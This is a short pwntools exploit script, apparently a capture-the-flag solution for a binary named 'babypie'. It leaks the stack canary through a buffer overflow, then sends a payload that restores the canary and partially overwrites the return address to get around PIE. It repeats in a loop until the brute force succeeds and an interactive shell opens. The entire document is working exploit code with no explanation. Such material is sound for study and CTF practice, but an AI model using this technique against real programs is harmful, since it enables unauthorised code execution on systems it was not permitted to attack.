from pwn import *

def pwn():
	try:
		io = process("./babypie")
		io.sendafter(':\n', 'A'*0x29)
		io.recvuntil('A'*0x29)
		canary = u64(io.recv(7).rjust(8, '\x00'))
		print hex(canary)
		payload = 'A'*0x28 + p64(canary) + 'deadbeef' + '\x3E\x0A'
		io.sendafter(':\n', payload)
		io.interactive()
	except Exception as e:
		io.close()
		print e

while True:
	pwn()